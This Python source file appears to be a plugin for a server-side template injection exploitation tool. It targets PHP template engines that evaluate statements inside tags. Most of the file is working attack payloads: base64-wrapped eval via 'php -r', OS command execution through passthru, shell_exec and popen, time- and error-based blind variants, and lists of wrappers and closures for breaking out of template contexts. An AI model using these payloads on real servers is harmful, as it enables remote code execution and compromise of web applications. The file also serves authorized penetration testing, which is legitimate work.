from plugins.languages import php
from utils import rand
from core import bash


class Php_generic(php.Php):
    priority = 9
    plugin_info = {
        "Description": """Template engines with PHP statement evaluation in tags""",
        "Usage notes": "This plugin can be used to speed up detection in simple contexts as well as for covering more of such engines.",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                #TODO: Add pre_header later: ini_set("error_reporting", "0")
                'header': '{header[0]}+{header[1]}',
                'trailer': '{trailer[0]}+{trailer[1]}',
                'test_render': f'"{rand.randints[0]}"+"{rand.randints[1]}"',
                'test_render_expected': f'{rand.randints[0]+rand.randints[1]}'
            },
            'render_error': {
                # Just use the wrapped payload for eval, but without ; in the end
                'wrapper_type': "global",
                'trailer': """)),strval({trailer[0]}+{trailer[1]})]))""",
            },
            'evaluate': {
                # Dirty hack from Twig
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'evaluate_boolean': {
                # Dirty hack from Twig
                'call': 'execute_blind',
                'evaluate_blind': """php -r '$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ");"));'""",
            },
            'evaluate_blind': {
                # Dirty hack from Twig
                'call': 'execute_blind',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'""",
            },
            'execute': {
                'call': 'render',
                # Using passthru to avoid double output
                'execute': """passthru(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_error': {
                # Using shell_exec to get full output
                'execute': """shell_exec(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))"""
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """1 / (pclose(popen(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), "wb")) == 0)"""
            },
            'execute_blind': {
                'call': 'inject',
                # Using passthru to avoid double output
                'execute_blind': """passthru(join("", [base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT))," && sleep {delay}"]))"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0, 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}", "<%={code}%>",
                                      "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}", "\n={code}\n"]},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["{{{code}}}"], 'suffix': '{"1"', 'closures': php.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{{code}}}}}"], 'suffix': '{{"1"', 'closures': php.ctx_closures},
            {'level': 2, 'prefix': '{closure}}}', 'wrappers': ["${{{code}}}"], 'suffix': '${"1"', 'closures': php.ctx_closures},
            {'level': 2, 'prefix': '{closure}%>', 'wrappers': ["<%={code}%>"], 'suffix': '<%="1"', 'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["#{{{code}}}"], 'suffix': '#{"1"', 'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}', 'wrappers': ["{{={code}}}"], 'suffix': '{="1"', 'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure}}}}}', 'wrappers': ["{{{{={code}}}}}"], 'suffix': '{{="1"', 'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure}\n', 'wrappers': ["\n={code}\n"], 'suffix': '\n="1"', 'closures': php.ctx_closures},
            {'level': 3, 'prefix': '{closure}%}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}",
                                                                "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{%"1"', 'closures': php.ctx_closures},
            # Comments
            {'level': 4, 'prefix': '*}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}",
                                                       "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{*'},
            {'level': 4, 'prefix': '#}}', 'wrappers': ["{{{code}}}", "{{{{{code}}}}}", "${{{code}}}",
                                                       "#{{{code}}}", "{{={code}}}", "{{{{={code}}}}}"], 'suffix': '{#'},
        ])
